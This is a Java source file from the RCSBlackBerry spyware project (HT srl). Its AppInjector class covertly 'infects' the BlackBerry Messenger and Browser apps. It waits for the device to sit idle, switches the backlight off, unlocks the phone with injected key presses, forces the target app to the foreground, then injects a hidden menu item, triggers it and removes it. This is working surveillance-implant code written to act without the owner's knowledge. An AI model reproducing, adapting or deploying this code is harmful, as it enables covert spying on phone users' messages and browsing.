//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.injection;

import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.Main;
import blackberry.agent.im.AppInjectorBBM;
import blackberry.agent.url.AppInjectorBrowser;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Utils;

public class AppInjector {
    public static final int APP_BBM = 1;
    public static final int APP_BROWSER = 2;
    //#ifdef DEBUG
    private static Debug debug = new Debug("AppInjector", DebugLevel.VERBOSE);
    //#endif

    private AppInjectorInterface delegate;

    ApplicationManager manager = ApplicationManager.getApplicationManager();
    public static final int KEY_LOCK = 4099;

    public AppInjector(int app) throws Exception {
        if (app == APP_BBM) {
            //#ifdef DEBUG
            debug.trace("AppInjector BBM");
            //#endif
            delegate = AppInjectorBBM.getInstance();
        } else if (app == APP_BROWSER) {
            //#ifdef DEBUG
            debug.trace("AppInjector BROWSER");
            //#endif
            delegate = AppInjectorBrowser.getInstance();
        } else {
            //#ifdef DEBUG
            debug.error("AppInjector, wrong value: " + app);
            //#endif
            throw new Exception();
        }
    }

    public boolean callMenuByKey() {
        //#ifdef DEBUG
        debug.trace("callMenu");
        //#endif

        final int foregroundProcess = manager.getForegroundProcessId();

        // debug.trace("searching Messenger or Browser");
        ApplicationDescriptor[] apps = manager.getVisibleApplications();
        for (int i = 0; i < apps.length; i++) {

            if (manager.getProcessId(apps[i]) == foregroundProcess) {
                //#ifdef DEBUG
                debug.trace("callMenuByKey foreground: " + apps[i].getName());
                //#endif

                if (apps[i].getName().indexOf(delegate.getAppName()) >= 0) {
                    //MemoryCleanerDaemon.cleanAll();
                    return delegate.callMenuByKey();

                }
            }
        }
        return false;
    }

    public boolean isInfected() {

        boolean infected = delegate.isInfected();
        //#ifdef DEBUG
        //debug.trace("isInfected: " + infected);
        //#endif
        return infected;
    }

    public void callMenuInContext() {
        //#ifdef DEBUG
        debug.trace("callInContext");
        //#endif

        //#ifdef DBC
        Check.requires(delegate != null, "callMenuInContext: null delegate");
        //#endif

        if (delegate.isInfected()) {
            delegate.callMenuInContext();
        } else {
            //#ifdef DEBUG
            debug.error("callMenuInContext: not infected");
            //#endif
        }
    }

    public synchronized void infect() {
        //#ifdef DEBUG
        debug.trace("infect");
        //#endif

        if (backlight() || isInfected()) {
            //#ifdef DEBUG
            debug.trace("infected or backlight, bailing out");
            //#endif
            return;
        }

        Utils.sleep(delegate.getDelay());

        if (isInfected()) {
            //#ifdef DEBUG
            debug.trace("infected, bailing out");
            //#endif
            return;
        }

        if (DeviceInfo.getIdleTime() < 10) {
            //#ifdef DEBUG
            debug.trace("infect: not enough idle time");
            //#endif
            return;
        }

        setBacklight(false);

        manager.requestForegroundForConsole();
        unLock();

        if (backlight()) {
            //#ifdef DEBUG
            debug.trace("infected: fail");
            //#endif
            return;
        }

        int req = requestForeground();
        Utils.sleep(200);
        boolean fore = checkForeground();

        if (fore) {
            try {
                Utils.sleep(200);
                delegate.injectMenu();
                Utils.sleep(200);
                if (!callMenuByKey()) {
                    //#ifdef DEBUG
                    debug.trace("infect: failed callMenuByKey");
                    //#endif
                }
                Utils.sleep(200);
            } catch (Exception ex) {
                //#ifdef DEBUG
                debug.error("infect: " + ex);
                //#endif
            }
            delegate.deleteMenu();
            Utils.sleep(200);

            //if (req == 2 && checkForeground()) {
            //#ifdef DEBUG
            debug.trace("infect: requesting foreground console");
            //#endif
            manager.requestForegroundForConsole();
            //}
        } else {
            //#ifdef DEBUG
            debug.error("infect: failed to get foreground");
            //#endif
        }
    }

    /**
     * verifica se occorre procedere con l'unlock.
     */
    private void unLock() {
        //#ifdef DEBUG
        debug.trace("unLock");
        //#endif

        if (!backlight()){
            //Main.getInstance().showBlackScreen(true);    
            //Utils.sleep(1000);
        }
       
        KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
        Utils.sleep(200);
        
        if (backlight()) {
            //#ifdef DEBUG
            debug.trace("Backlight still enabled, getHardwareLayout: "
                    + Keypad.getHardwareLayout());
            //#endif

            KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
            Utils.sleep(200);
            KeyInjector.pressRawKeyCode(KEY_LOCK);
            Utils.sleep(200);
            setBacklight(false);
            Utils.sleep(500);
            for (int i = 0; i < 10; i++) {
                if (backlight()) {
                    //Backlight.enable(false);
                    Utils.sleep(500);
                    //#ifdef DEBUG
                    debug.trace("unLock: backlight still enabled");
                    //#endif
                } else {
                    break;
                }
            }

            return;
        }
        
        Main.getInstance().showBlackScreen(false); 
    }

    private boolean backlight() {
        boolean ret = false;
        ret = Backlight.isEnabled();
        return ret;
    }

    private void setBacklight(boolean value) {
        Backlight.enable(value);
    }

    private boolean checkForeground() {
        int foregroundPin = manager.getForegroundProcessId();
        ApplicationDescriptor[] apps = manager.getVisibleApplications();
        for (int i = 0; i < apps.length; i++) {
            if (apps[i].getName().indexOf(delegate.getAppName()) >= 0) {
                int processId = manager.getProcessId(apps[i]);

                if (foregroundPin == processId) {
                    Screen screen = UiApplication.getUiApplication()
                            .getActiveScreen();
                    //#ifdef DEBUG
                    debug.trace("checkForeground, found acrive screen: "
                            + screen);
                    //#endif
                    return true;
                } else {
                    return false;
                }
            }
        }
        return false;
    }

    private int requestForeground() {
        int foregroundPin = manager.getForegroundProcessId();
        ApplicationDescriptor[] apps = manager.getVisibleApplications();
        for (int i = 0; i < apps.length; i++) {
            if (apps[i].getName().indexOf(delegate.getAppName()) >= 0) {
                int processId = manager.getProcessId(apps[i]);

                if (foregroundPin == processId) {
                    //#ifdef DEBUG
                    debug.trace("requestForeground: already foreground");
                    //#endif
                    return 1;
                } else {
                    //#ifdef DEBUG
                    debug.trace("requestForeground: bringing foreground");
                    //#endif
                    manager.requestForeground(processId);
                    return 2;
                }
            }
        }

        return 0;
    }

    public void reset() {
        delegate.reset();
    }

    //#ifdef DEBUG
    public void disinfect() {
        delegate.setInfected(false);
    }
    //#endif

}
